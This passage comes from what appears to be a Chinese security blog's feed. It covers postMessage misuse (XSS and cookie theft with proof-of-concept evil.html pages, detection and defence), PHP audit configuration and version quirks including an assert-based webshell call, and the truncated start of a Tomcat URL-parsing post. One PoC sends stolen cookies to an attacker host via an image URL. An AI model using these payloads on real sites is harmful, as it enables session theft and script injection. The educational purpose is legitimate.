class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 把父窗口发送过来的数据显示在子窗口中</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"content"</span>).innerHTML += event.data + <span class="string">"origin: "</span> + event.origin + <span class="string">"&lt;br/&gt;"</span>; </span></span><br><span class="line"><span class="actionscript">&#125;, <span class="literal">false</span>); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Web page from http://child.com</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.html，放置在攻击者服务器attack.com中，将child.com/child.html通过iframe引入其中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span> <span class="attr">id</span>=<span class="string">"otherPage"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> i = <span class="built_in">document</span>.getElementById(<span class="string">"otherPage"</span>);</span></span><br><span class="line"><span class="actionscript">i.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">i.contentWindow.postMessage(<span class="string">"&lt;img src=x onerror='alert(document.location);'"</span>, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后诱使用户访问attack.com/evil.html，即可触发XSS：</p><p><img src="/2020/04/06/浅析postMessage安全/2.png" alt=""></p><h4 id="window-open引用"><a href="#window-open引用" class="headerlink" title="window.open引用"></a>window.open引用</h4><p>如果目标站点设置了X-Frame-Options时，则无法通过使用iframe，此时需要通过window.open来引用了。</p><p>child.php，设置了X-Frame-Options为同源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;?php header(&apos;X-Frame-Options: SAMEORIGIN&apos;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Web page from child.com&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">// event参数中有data属性，就是父窗口发送过来的数据</span><br><span class="line">window.addEventListener(&quot;message&quot;, function(event) &#123;</span><br><span class="line">// 把父窗口发送过来的数据显示在子窗口中</span><br><span class="line">document.getElementById(&quot;content&quot;).innerHTML += event.data + &quot;origin: &quot; + event.origin + &quot;&lt;br/&gt;&quot;; </span><br><span class="line">&#125;, false); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Web page from http://child.com</span><br><span class="line">&lt;div id=&quot;content&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> receiver = <span class="built_in">window</span>.open(<span class="string">'http://192.168.203.1/child.php'</span>, <span class="string">'title'</span>);</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">receiver.postMessage(<span class="string">"&lt;img src=x onerror='alert(document.location);'"</span>, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">setTimeout(post, 1000);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使用户访问，window.open会新建一个标签访问然后触发XSS：</p><p><img src="/2020/04/06/浅析postMessage安全/3.png" alt=""></p><h4 id="排查方法"><a href="#排查方法" class="headerlink" title="排查方法"></a>排查方法</h4><p>在Chrome中的Global Listeners出查看当前页面存在几个监听器，然后逐个打断点调试分析：</p><p><img src="/2020/04/06/浅析postMessage安全/4.png" alt=""></p><p>找到对应的监听器后，可以在Console中使用如下payload进行调试：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.postMessage(<span class="string">'mi1k7ea'</span>, <span class="string">'*'</span>);</span><br></pre></td></tr></table></figure><p><img src="/2020/04/06/浅析postMessage安全/5.png" alt=""></p><h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h4><p>子窗口对于父窗口的来源应设置白名单判断，只接受可信父窗口传输的数据，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// event参数中有data属性，就是父窗口发送过来的数据</span></span></span><br><span class="line"><span class="actionscript">onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (event.origin == <span class="string">'http://father.com'</span>)&#123;</span></span><br><span class="line"><span class="undefined">            /*</span></span><br><span class="line"><span class="actionscript">            to <span class="keyword">do</span> something</span></span><br><span class="line"><span class="undefined">            */</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此外，还可以设置X-Frame-Options头为白名单域，提高利用门槛。</p><h3 id="伪造数据接收端"><a href="#伪造数据接收端" class="headerlink" title="伪造数据接收端"></a>伪造数据接收端</h3><p>如果数据接收端是如下的写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">targetWindow.postMessage(message, <span class="string">'*'</span>);</span><br></pre></td></tr></table></figure><p>这表明该消息任何窗口都可以接收到，但这里重点不是“攻击者能不能接收到”，而是“发不发给攻击者”。换句话说，如果targetWindow是子窗口的话，除非我们可以控制它的子窗口，否则是无法接收到消息的，即使该消息允许任何窗口接收。</p><p>但是，当消息发送给window.parent或window.opener时，则可以进行攻击利用，窃取用户敏感信息。</p><h4 id="window-parent"><a href="#window-parent" class="headerlink" title="window.parent"></a>window.parent</h4><p>window.parent中parent表示父窗口，比如一个A页面利用iframe或frame调用B页面，那么A页面就是B页面的parent。</p><p>child.html，将消息发送给引用本页面的父窗口：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>User info center<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> userinfo = <span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.parent.postMessage(userinfo, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Web page from http://child.com </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span>(event.origin == <span class="string">"http://192.168.203.1"</span>)&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span></span><br><span class="line"><span class="actionscript">img.src = <span class="string">'http://127.0.0.1:1234/userinfo='</span> + event.data;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"otherPage"</span>).appendChild(img);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span> <span class="attr">id</span>=<span class="string">"otherPage"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使访问，在攻击者服务器上成功窃取到用户信息：</p><p><img src="/2020/04/06/浅析postMessage安全/6.png" alt=""></p><p>当然，直接弹框也是ok的，改下evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">alert(event.origin + <span class="string">" say: \n"</span> + event.data);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/06/浅析postMessage安全/7.png" alt=""></p><h4 id="window-opener"><a href="#window-opener" class="headerlink" title="window.opener"></a>window.opener</h4><p>window.opener中的opener表示谁打开我的，比如一个A页面利用window.open弹出了B页面，那么A页面就是B页面的opener。</p><p> child.html，和前面的几乎一样，只是将window.parent改为window.opener而已：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>User info center<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> userinfo = <span class="string">"phone: 13666666666"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.opener.postMessage(userinfo, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Web page from http://child.com </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> receiver = <span class="built_in">window</span>.open(<span class="string">'http://192.168.203.1/child.html'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">alert(event.origin + <span class="string">" say: \n"</span> + event.data);</span></span><br><span class="line"><span class="actionscript">&#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使用户访问，打开新标签访问之后，返回父窗口即可触发XSS：</p><p><img src="/2020/04/06/浅析postMessage安全/8.png" alt=""></p><h4 id="排查方法-1"><a href="#排查方法-1" class="headerlink" title="排查方法"></a>排查方法</h4><p>使用Chrome的全局搜索功能，搜索<code>postMessage</code>关键词：</p><p><img src="/2020/04/06/浅析postMessage安全/9.png" alt=""></p><p>然后对postMessage()函数的第二个参数进行排查，查看是否设置为<code>*</code>，若是则存在漏洞。</p><h4 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h4><p>对于postMessage()函数的第二个参数需要正确的配置，严格限制父窗口来源，禁止使用<code>*</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>User info center<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> userinfo = <span class="string">"phone: 13666666666"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.opener.postMessage(userinfo, <span class="string">"http://father.com"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Web page from http://child.com </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.jianshu.com/p/62f1c080748a" target="_blank" rel="noopener">利用window.postMessage()实现跨域消息传递（JavaScript）</a></p><p><a href="https://www.jianshu.com/p/bb427abcaf9e" target="_blank" rel="noopener">html5的postMessage简易通俗使用说明</a></p><p><a href="https://xuptsec.github.io/2018/09/11/postMessage%E5%AE%89%E5%85%A8%E6%80%A7%E7%9A%84%E4%B8%80%E7%82%B9%E7%82%B9%E7%A0%94%E7%A9%B6/" target="_blank" rel="noopener">postMessage安全性的一点点研究</a></p><p><a href="https://p0sec.net/index.php/archives/124/" target="_blank" rel="noopener">postMessage 滥用导致的安全风险</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="postMessage" scheme="https://www.mi1k7ea.com/tags/postMessage/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计敏感配置与版本特性</title>
    <link href="https://www.mi1k7ea.com/2020/04/06/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%95%8F%E6%84%9F%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7/"/>
    <id>https://www.mi1k7ea.com/2020/04/06/PHP代码审计敏感配置与版本特性/</id>
    <published>2020-04-06T03:38:00.000Z</published>
    <updated>2020-04-06T04:27:37.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-PHP敏感配置项"><a href="#0x01-PHP敏感配置项" class="headerlink" title="0x01 PHP敏感配置项"></a>0x01 PHP敏感配置项</h2><h3 id="register-globals（PHP版本-lt-5-4-时存在）"><a href="#register-globals（PHP版本-lt-5-4-时存在）" class="headerlink" title="register_globals（PHP版本 &lt; 5.4 时存在）"></a>register_globals（PHP版本 &lt; 5.4 时存在）</h3><p>当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在未初始化的变量时，可能会导致变量覆盖漏洞。</p><p>注意：其中参数覆盖的顺序受到配置文件中<code>variables_order</code>的参数影响，默认是<code>EGPCS</code>。按顺序，右边的参数来源会覆盖左边的参数来源。</p><h3 id="allow-url-include（PHP版本-gt-5-2-默认为OFF）"><a href="#allow-url-include（PHP版本-gt-5-2-默认为OFF）" class="headerlink" title="allow_url_include（PHP版本 &gt; 5.2 默认为OFF）"></a>allow_url_include（PHP版本 &gt; 5.2 默认为OFF）</h3><p>当该配置项为ON时，可以通过include、require等函数进行远程文件包含。</p><p>另外，有个类似的配置项allow_url_fopen，这个参数配置为ON时可以在函数中如file_get_contents中打开URL。</p><p>当这两个配置项都为ON时，可以直接使用URL进行远程包含；当include为ON、fopen为OFF时，只能通过PHP伪协议进行包含。</p><h3 id="magic-quato-gpc（PHP版本-lt-5-4-存在）"><a href="#magic-quato-gpc（PHP版本-lt-5-4-存在）" class="headerlink" title="magic_quato_gpc（PHP版本 &lt; 5.4 存在）"></a>magic_quato_gpc（PHP版本 &lt; 5.4 存在）</h3><p>当该配置项为ON时，会在GET、POST、COOKIE变量中的单引号<code>&#39;</code>、双引号<code>&quot;</code>、反斜杠<code>\</code>、空字符（Null）前添加反斜杠进行转义。</p><p>注意：<strong>该配置并不会对SERVER变量里的特殊字符进行转义</strong>，因此可能会导致Referer、Client-Ip等存在注入漏洞。</p><h3 id="magic-quato-runtime（PHP版本-lt-5-4-存在）"><a href="#magic-quato-runtime（PHP版本-lt-5-4-存在）" class="headerlink" title="magic_quato_runtime（PHP版本 &lt; 5.4 存在）"></a>magic_quato_runtime（PHP版本 &lt; 5.4 存在）</h3><p>该配置项和magic_quato_gpc的区别在于runtime是对从数据库或者文件中取出的数据进行转义，因此只对例如file()、fgets()、fread()、mysql_fetch_array()等很多对数据库查询和文件读取的函数产生影响。</p><h3 id="magic-quato-sybase（PHP版本-lt-5-4-存在）"><a href="#magic-quato-sybase（PHP版本-lt-5-4-存在）" class="headerlink" title="magic_quato_sybase（PHP版本 &lt; 5.4 存在）"></a>magic_quato_sybase（PHP版本 &lt; 5.4 存在）</h3><p>该配置项和magic_quato_gpc的区别在于，<strong>sybase只会转义空字符，把单引号转为双引号，并且这个配置若为ON则会覆盖gpc的配置</strong>。</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p>该配置项用来设定PHP程序只能访问哪些目录。在Windows下多个目录用分号<code>;</code>分割，在Linux下是用冒号<code>:</code>进行分割。</p><p>注意：<strong>配置的目录需要用斜杠<code>/</code>进行封尾，否则就变成了前缀匹配</strong>。</p><p>比如，配置/var/test，那么/var/test和/var/test123都是可以进行访问的，如果指定一个确定的目录就要写成/var/test/。</p><p>绕过技巧参考：<a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">《浅谈几种Bypass open_basedir的方法》</a></p><h2 id="0x02-PHP各版本的姿势"><a href="#0x02-PHP各版本的姿势" class="headerlink" title="0x02 PHP各版本的姿势"></a>0x02 PHP各版本的姿势</h2><h3 id="PHP-5-2-以前"><a href="#PHP-5-2-以前" class="headerlink" title="PHP 5.2 以前"></a>PHP 5.2 以前</h3><p>__autoload加载类文件，但该函数只能调用一次，所以可以用spl_autoload_register加载类。</p><h3 id="PHP-5-3"><a href="#PHP-5-3" class="headerlink" title="PHP 5.3"></a>PHP 5.3</h3><ul><li><p>新增了glob://和phar://两个伪协议。</p><p>glob://伪协议用于列目录，可绕过open_basedir；</p><p>phar://伪协议在文件包含中可以用来绕过一些后缀的限制，另外在CTF中有phar反序列化漏洞的扩展；</p><p><a href="https://www.php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.phar.php</a></p></li><li><p>新的全局变量DIR。</p></li><li><p>默认开启<code>&lt;?= $xxoo;?&gt;</code>，在5.4也可用。</p></li></ul><h3 id="PHP-5-4"><a href="#PHP-5-4" class="headerlink" title="PHP 5.4"></a>PHP 5.4</h3><ul><li><p>移除安全模式、魔术引号；</p></li><li><p>register_globals和register_long_arrays等php.ini指令被移除；</p></li><li><p>php.ini新增session.upload_progress.enabled，默认为1，可用来文件包含；</p><p><a href="https://www.php.net/manual/zh/session.configuration.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.configuration.php</a></p><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a></p></li></ul><h3 id="PHP-5-5"><a href="#PHP-5-5" class="headerlink" title="PHP 5.5"></a>PHP 5.5</h3><p>废除preg_replace的/e模式（不是移除），当使用被弃用的e修饰符时，这个函数会转义一些字符（即<code>&#39;</code>、<code>&quot;</code>和Null），然后进行后向引用替换。</p><p><a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.preg-replace.php</a></p><h3 id="PHP-5-6"><a href="#PHP-5-6" class="headerlink" title="PHP 5.6"></a>PHP 5.6</h3><p>使用<code>...</code>运算符定义可变长度参数函数。</p><p><a href="https://www.php.net/manual/zh/functions.arguments.php#functions.variable-arg-list" target="_blank" rel="noopener">https://www.php.net/manual/zh/functions.arguments.php#functions.variable-arg-list</a></p><h3 id="PHP-7-0"><a href="#PHP-7-0" class="headerlink" title="PHP 7.0"></a>PHP 7.0</h3><ul><li><p>十六进制字符串不再被认为是数字；</p></li><li><p>移除asp和script php标签；</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;</span><br><span class="line">&lt;%= %&gt;</span><br><span class="line">&lt;script language="php"&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>在后面的版本中assert变成语言结构，这意味着很多一句话木马不能使用。目前经过测试，可使用的有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="string">'assert'</span>, <span class="string">'phpinfo();'</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="PHP-7-1"><a href="#PHP-7-1" class="headerlink" title="PHP 7.1"></a>PHP 7.1</h3><p>废除mb_ereg_replace()和mb_eregi_replace()的Eval选项。</p><p><a href="https://www.php.net/manual/zh/migration71.new-features.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/migration71.new-features.php</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat URL解析差异性及利用</title>
    <link href="https://www.mi1k7ea.com/2020/04/01/Tomcat-URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mi1k7ea.com/2020/04/01/Tomcat-URL解析差异性及利用/</id>
    <published>2020-04-01T15:47:17.000Z</published>
    <updated>2020-04-05T17:08:30.724Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。</p><p>当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。</p><h2 id="0x02-URL解析差异性"><a href="#0x02-URL解析差异性" class="headerlink" title="0x02 URL解析差异性"></a>0x02 URL解析差异性</h2><h3 id="HttpServletRequest中几个解析URL的函数"><a href="#HttpServletRequest中几个解析URL的函数" class="headerlink" 